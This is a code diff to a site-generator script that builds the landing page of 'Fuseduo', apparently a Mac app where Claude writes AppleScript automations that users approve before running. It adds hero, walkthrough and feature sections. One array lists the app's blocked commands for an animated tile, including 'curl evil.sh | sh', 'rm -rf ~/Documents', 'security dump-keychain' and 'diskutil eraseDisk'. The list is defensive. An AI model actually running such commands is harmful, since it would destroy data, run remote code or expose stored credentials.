@@ -10,7 +10,7 @@ const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
 const ORIGIN = 'https://hollowbit.dev';
 const BASE = '/fuseduo/';
 const hash = (f) => createHash('md5').update(readFileSync(resolve(root, f))).digest('hex').slice(0, 8);
-const V = { css: hash('fuseduo/assets/fd.css'), js: hash('fuseduo/assets/fd.js') };
+const V = { css: hash('fuseduo/assets/fd.css'), js: hash('fuseduo/assets/fd.js'), fx: hash('fuseduo/assets/fx.js') };
 const OG = (() => { try { return hash('fuseduo/assets/img/og.png'); } catch { return '0'; } })();
 const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
 
@@ -72,7 +72,7 @@ function page({ path, title, desc, body, demo }) {
 <script>document.documentElement.classList.add('js')</script>
 </head>
 <body>
-<div class="wash" aria-hidden="true"><i></i><i></i><i></i></div>
+<div class="wash" aria-hidden="true"><i></i><i></i><i></i><i></i></div><div class="dots" aria-hidden="true"></div><div class="dots-lit" aria-hidden="true"></div><div class="grain" aria-hidden="true"></div>
 ${demo ? '<svg width="0" height="0" style="position:absolute" aria-hidden="true"><filter id="fd-goo"><feGaussianBlur in="SourceGraphic" stdDeviation="10" result="b"/><feColorMatrix in="b" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 22 -9"/></filter></svg>' : ''}
 <header class="nav"><div class="nav-in glass">
   <a class="logo" href="${BASE}"><img src="${BASE}assets/img/icon-64.png" alt="" width="30" height="30">Fuseduo <small>by Hollowbit</small></a>
@@ -96,6 +96,7 @@ ${body}
   <p class="copy">© ${new Date().getFullYear()} Hollowbit Studio. Fuseduo is an independent project and isn’t affiliated with Apple or Anthropic. App names and icons belong to their owners.</p>
 </div></footer>
 <script src="${BASE}assets/fd.js?v=${V.js}" defer></script>
+<script src="${BASE}assets/fx.js?v=${V.fx}" defer></script>
 </body>
 </html>
 `;
@@ -128,17 +129,72 @@ const row = (list, rev) => `<div class="row${rev ? ' rev' : ''}">${[...list, ...
 const cursorSvg = '<svg viewBox="0 0 24 24"><path d="M5 3.5 19 12l-6.2 1.6L9.6 20 5 3.5Z" fill="#fff" stroke="#111" stroke-width="1.2" stroke-linejoin="round"/></svg>';
 
 /* ---------- home ---------- */
+const STORY = [
+  ['Drag', 'Pick up one app and drop it on another.'],
+  ['Melt', 'They fuse. Claude looks at what both can really do.'],
+  ['Pick', 'Three ideas, from delightful to practical. Or type your own.'],
+  ['Read', 'The plan in plain English, checked and compiled.'],
+  ['Run', 'Press Run when you’re happy. Save it for one click next time.'],
+];
+const STORY_IDEAS = [['Save my open tabs', 'Every tab’s title and link in one new note.'], ['Quote the page', 'Highlighted text plus its link, into Clippings.'], ['Reading list note', 'Your Reading List as a checklist.']];
+const BLOCKED = ['rm -rf ~/Documents', 'sudo shutdown -h now', 'send message to Mum', 'empty the trash', 'curl evil.sh | sh', 'defaults write …', 'security dump-keychain', 'delete every note', 'diskutil eraseDisk', 'move file to trash'];
 const home = page({
   path: '', demo: true,
   title: 'Fuseduo · Drop one Mac app onto another. Get an automation.',
   desc: 'Fuseduo turns two Mac apps into a working automation. Drag one onto the other, pick an idea, read the plan in plain English, and approve it before anything runs.',
-  body: `<section class="hero"><div class="wrap">
-  <a class="soon" href="#notify"><b>Early preview</b>Coming to Mac. Get notified →</a>
-  <h1 class="words">${words('Drop one app on another.')}<br><span class="grad-text">${words('Get an automation.')}</span></h1>
-  <p class="lede" data-reveal style="--d:.5s">Fuseduo is a board of every app on your Mac. Fuse two of them and Claude suggests what they could do together, writes it as a real script, and shows you exactly what it does before anything runs.</p>
-  <div class="cta" data-reveal style="--d:.65s"><a class="btn btn-brand big" href="#notify">Get notified</a><a class="btn btn-glass big" href="${BASE}how-it-works/">See how it works</a></div>
+  body: `<section class="hero2">
+  <div class="beams" aria-hidden="true"></div>
+  <div class="wrap">
+    <a class="soon" href="#notify"><b>Early preview</b>Coming to Mac. Get notified →</a>
+    <h1 class="words">${words('Drop one app on another.')}<br><span class="grad-text">${words('Get an automation.')}</span></h1>
+    <p class="lede" data-reveal style="--d:.5s">Every app on your Mac, on one board. Fuse any two and Claude invents what they could do together, writes it as a real script, and shows you exactly what it does before anything runs.</p>
+    <div class="cta" data-reveal style="--d:.65s"><a class="btn btn-brand big" href="#notify">Get notified</a><a class="btn btn-glass big" href="#try">Try the demo</a></div>
+  </div>
+  <div class="orbit" aria-hidden="true">
+    <div class="orbit-ring r1"></div><div class="orbit-ring r2"></div>
+    <div class="core"><span class="halo"></span><span class="pulse"></span><span class="pulse p2"></span><img src="${BASE}assets/img/icon-256.png" alt="" width="150" height="150"></div>
+    <canvas class="hero-sparks"></canvas>
+  </div>
+</section>
+
+<section class="section tight"><div class="wrap">
+  <div class="stats" data-reveal>
+    <div class="stat"><b><span data-count="3">0</span></b><span>ideas for every pair</span></div>
+    <div class="stat"><b>~<span data-count="9" data-suffix="s">0</span></b><span>to a built script on Fast, in testing</span></div>
+    <div class="stat"><b><span data-count="12">0</span></b><span>kinds of risky script blocked</span></div>
+    <div class="stat"><b><span data-count="0">0</span></b><span>scripts that run without your OK</span></div>
+  </div>
+</div></section>
+
+<section class="story" aria-label="How a fusion happens">
+  <div class="story-pin">
+    <div>
+      <p class="eyebrow"><span class="pip"></span>One fusion, frame by frame</p>
+      <h2 style="margin-bottom:26px">Safari + Notes,<br><span class="grad-text">in five moves.</span></h2>
+      <ol class="story-steps">${STORY.map(([b, t], i) => `<li data-n="${i + 1}"><b>${b}</b><span>${t}</span></li>`).join('')}</ol>
+      <div class="story-bar"><i></i></div>
+    </div>
+    <div class="story-vis">
+      <div class="sv-goo"><span class="sv-blob a" style="background:#33b5ff"></span><span class="sv-blob b" style="background:#f6c945"></span></div>
+      <img class="sv sv-app sv-a" src="${BASE}assets/apps/safari.png" alt="">
+      <img class="sv sv-app sv-b" src="${BASE}assets/apps/notes.png" alt="">
+      <div class="sv sv-orb"></div>
+      ${STORY_IDEAS.map(([t, d]) => `<div class="sv sv-card"><b>${t}</b><p>${d}</p></div>`).join('')}
+      <div class="sv sv-plan">
+        <h4>Save my open tabs</h4><div class="sub">Safari + Notes · Low risk · AppleScript</div>
+        <ol><li><i>1</i>Goes through every Safari window and tab</li><li><i>2</i>Collects each page’s title and link</li><li><i>3</i>Creates a new dated note with the list</li><li><i>✓</i>Compiles. Nothing on the block-list.</li></ol>
+        <div class="sv-run">${I('M7 4.5v15l12.5-7.5z')}Approve and run</div>
+        <div class="sv-done">✓ Saved 14 tabs to “Tabs · Today”</div>
+      </div>
+      <canvas></canvas>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="try"><div class="wrap">
+  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Try it yourself</p><h2>Go on, <span class="grad-text">fuse something.</span></h2><p class="lede">This board is live. Drag any app onto another and walk through a fusion.</p></div>
 </div>
-<div class="demo-wrap" data-reveal style="--d:.8s">
+<div class="demo-wrap" data-reveal>
   <div class="demo-glow"></div>
   <div class="window">
     <div class="titlebar"><i></i><i></i><i></i><span>Fuseduo</span><span class="hint" id="hint"></span></div>
@@ -155,32 +211,44 @@ const home = page({
       </aside>
     </div>
   </div>
-  <p class="demo-note">A live demo with example ideas. In the app, Claude writes ideas for whatever two apps you choose. <button id="replay">Replay</button></p>
+  <p class="demo-note">Example ideas. In the app, Claude writes them for whatever two apps you choose. <button id="replay">Replay</button></p>
 </div></section>
 
-<section class="section tight"><div class="section-head wrap" data-reveal><p class="eyebrow"><span class="pip"></span>Any two apps</p><h2>Small magic, made to order.</h2><p class="lede">Every pair gives three ideas, or describe your own. Here are a few people would make first.</p></div>
-  <div class="marquee" data-reveal>${row(FUSIONS.slice(0, 5))}${row(FUSIONS.slice(5), true)}</div>
+<section class="section"><div class="wrap">
+  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Built in</p><h2>Powerful. <span class="grad-text">Careful.</span> Quick.</h2></div>
+  <div class="bento">
+    <div class="tile w2" data-reveal><h3>Runs on your Claude plan</h3><p>Got Claude Code? Fuseduo uses it. No API key, no extra subscription.</p><div class="art"><div class="term"></div></div></div>
+    <div class="tile" data-reveal style="--d:.06s"><h3>Best or Fast</h3><p>Real build times from testing.</p><div class="art"><div class="race">
+      <div class="race-row"><div><b>Best · Opus 5.5</b><span>23.8 s</span></div><div class="race-bar best" style="--d:9.5s"><i></i></div></div>
+      <div class="race-row"><div><b>Fast · Sonnet 5.5</b><span>8.5 s</span></div><div class="race-bar fast" style="--d:3.4s"><i></i></div></div>
+    </div></div></div>
+    <div class="tile" data-reveal><h3>Nothing runs unseen</h3><p>You press Run. Every time.</p><div class="art"><div class="approve"><span class="ripple"></span><span class="btn btn-brand">Approve and run</span><span class="ok">✓ Done</span><svg class="hand" viewBox="0 0 24 24"><path d="M5 3.5 19 12l-6.2 1.6L9.6 20 5 3.5Z" fill="#fff" stroke="#111" stroke-width="1.2" stroke-linejoin="round"/></svg></div></div></div>
+    <div class="tile" data-reveal style="--d:.06s"><h3>A hard block-list</h3><p>Risky scripts never get a Run button.</p><div class="art"><div class="blk"><div class="blk-col">${[...BLOCKED, ...BLOCKED].map((b, i) => `<span style="--sd:${(i % BLOCKED.length) * 1.4}s">${b}</span>`).join('')}</div></div></div></div>
+    <div class="tile" data-reveal style="--d:.12s"><h3>Any two apps</h3><p>Every app on your Mac can fuse with every other.</p><div class="art"><div class="pairs">${['notes', 'calendar', 'reminders', 'mail', 'safari', 'music', 'photos', 'messages'].map((a) => `<img src="${BASE}assets/apps/${a}.png" alt="">`).join('')}<svg><defs><linearGradient id="beamGrad"><stop offset="0" stop-color="#a78bfa"/><stop offset=".5" stop-color="#22d3ee"/><stop offset="1" stop-color="#f472b6"/></linearGradient></defs><path/></svg></div></div></div>
+    <div class="tile w3" data-reveal><h3>Saved fusions, one click away</h3><p>Keep the ones you love. See when each last ran and whether it worked.</p><div class="art"><div class="stack">${FUSIONS.slice(0, 5).map(([a, b, t]) => `<div class="scard"><span class="duo"><img src="${BASE}assets/apps/${a}.png" alt=""><img src="${BASE}assets/apps/${b}.png" alt=""></span><span><b>${t}</b><small><i></i>Ran just now</small></span><span class="play"><svg viewBox="0 0 24 24"><path d="M7 4.5v15l12.5-7.5z"/></svg></span></div>`).join('')}</div></div></div>
+  </div>
+</div></section>
+
+<section class="section tight" style="overflow:hidden"><div class="section-head wrap" data-reveal><p class="eyebrow"><span class="pip"></span>Any two apps</p><h2>Small magic, <span class="grad-text">made to order.</span></h2></div>
+  <div class="marquee tilt" data-reveal>${row(FUSIONS.slice(0, 5))}${row(FUSIONS.slice(5), true)}${row([...FUSIONS].reverse().slice(0, 5))}</div>
 </section>
 
 <section class="section"><div class="wrap">
-  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>The real app</p><h2>Read it. Approve it. Run it.</h2><p class="lede">Every fusion comes with the steps in plain English, a risk rating, the permissions it needs and how to undo it. The script is right there if you want to look.</p></div>
+  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>The real app</p><h2>Read it. Approve it. <span class="grad-text">Run it.</span></h2><p class="lede">Steps in plain English, a risk rating, the permissions it needs and how to undo it. The script is right there if you want to look.</p></div>
   <div class="shot"><div class="shot-in"><img src="${BASE}assets/img/app-plan.webp" alt="Fuseduo showing a fusion of Music and Notes, with its steps, a low risk rating and the AppleScript it wrote." width="1600" height="1000" loading="lazy"></div></div>
-  <div class="caption-row">
-    <div class="cap" data-reveal><b>Plain English first</b><p>Each step says what it does to your Mac, so you never have to read code to know.</p></div>
-    <div class="cap" data-reveal style="--d:.08s"><b>Checked before you see it</b><p>Scripts are compiled and screened against a safety list before the Run button lights up.</p></div>
-    <div class="cap" data-reveal style="--d:.16s"><b>One click next time</b><p>Save a fusion and it lives on your shelf, with when it last ran and whether it worked.</p></div>
-  </div>
 </div></section>
 
-<section class="section"><div class="wrap">
-  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Why it’s different</p><h2>Automation without the flowchart.</h2></div>
-  <div class="grid3">
-    ${card('star', 'Play, don’t program', 'No blocks, triggers or variables to learn. Pick two apps you already use and see what they can do together.')}
-    ${card('eye', 'Nothing runs unseen', 'You read the plan and press Run yourself. Fuseduo never runs a script you haven’t approved.', 0.08)}
-    ${card('key', 'Uses your Claude plan', 'If you have Claude Code, it uses your existing plan. No API key or extra subscription needed.', 0.16)}
+<section class="finale" id="notify">
+  <div class="beams" aria-hidden="true"></div>
+  <div class="wrap narrow" data-reveal>
+    <div class="core"><span class="halo"></span><span class="pulse"></span><span class="pulse p2"></span><img src="${BASE}assets/img/icon-256.png" alt="" width="150" height="150"></div>
+    <h2>Fuse <span class="grad-text">anything.</span></h2>
+    <p class="lede">Fuseduo is in early preview on Mac. Send a quick email and you’ll hear the day it’s ready, or follow along as it’s built.</p>
+    <div class="cta"><a class="btn btn-brand big" data-email-link="Fuseduo: tell me when it’s out" href="/contact/">${I('M3.5 6.5h17v11h-17zM4 7l8 6.5L20 7')}Email me when it’s out</a></div>
+    ${socials()}
+    <p class="small" style="margin-top:18px">No newsletter, no tracking. One email when it launches.</p>
   </div>
-</div></section>
-${notify}`,
+</section>`,
 });
 
 /* ---------- how it works ---------- */
